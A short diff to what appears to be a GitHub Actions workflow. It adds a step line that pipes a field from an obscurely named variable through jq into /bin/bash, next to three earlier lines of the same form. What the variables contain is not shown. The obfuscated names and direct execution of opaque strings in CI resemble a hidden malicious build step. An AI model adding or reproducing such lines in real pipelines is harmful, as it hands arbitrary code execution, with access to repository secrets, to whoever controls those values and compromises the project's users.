@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$lwi5" | jq -r .k003 | /bin/bash
           echo $rfubd0 | jq -r .yoy6481 | /bin/bash
           echo $alfw566 | jq -r .rlw3775 | /bin/bash
+          echo $tehj91740 | jq -r .lf90453 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
